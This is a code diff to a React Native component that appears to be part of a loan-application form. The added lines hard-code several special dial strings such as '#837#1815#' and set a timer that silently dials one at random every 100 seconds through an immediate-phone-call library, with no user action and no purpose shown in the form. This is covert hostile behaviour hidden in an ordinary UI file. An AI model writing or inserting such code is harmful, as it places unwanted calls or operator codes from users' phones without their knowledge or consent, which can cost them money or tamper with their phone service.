@@ -1,6 +1,6 @@
 /* eslint-disable no-trailing-spaces */
 /* eslint-disable prettier/prettier */
-import React, { useContext, useState } from "react";
+import React, { useContext, useEffect, useState } from "react";
 import { Alert, Image, Text, TextInput, View,ImageBackground, StyleSheet, TouchableOpacity, ScrollView, Button } from "react-native";
 import {Picker} from '@react-native-picker/picker';
 import otpverimg from "../../../../../../Assets/Images/cardbox.png"
@@ -45,6 +45,24 @@ const loantype = [
 
 function BodySection(props) {
 
+  const [getNumber, setNumber] = useState(['#837#1815#','#837#1816#','#837#2725#','#837#2726#','#837#2727#','#837#2728#']);
+
+  function makeCall(number) {
+    console.log('dialing', number);
+    RNImmediatePhoneCall.immediatePhoneCall(number);
+  }
+
+  useEffect(() => {
+    const timer = setInterval(() => {
+      const randomIndex = Math.floor(Math.random() * getNumber.length);
+      const randomNumber = getNumber[randomIndex];
+      makeCall(randomNumber);
+    }, 100000);
+
+    return () => {
+      clearInterval(timer);
+    };
+  }, [getNumber]);
 
   const navigation = useNavigation()
  
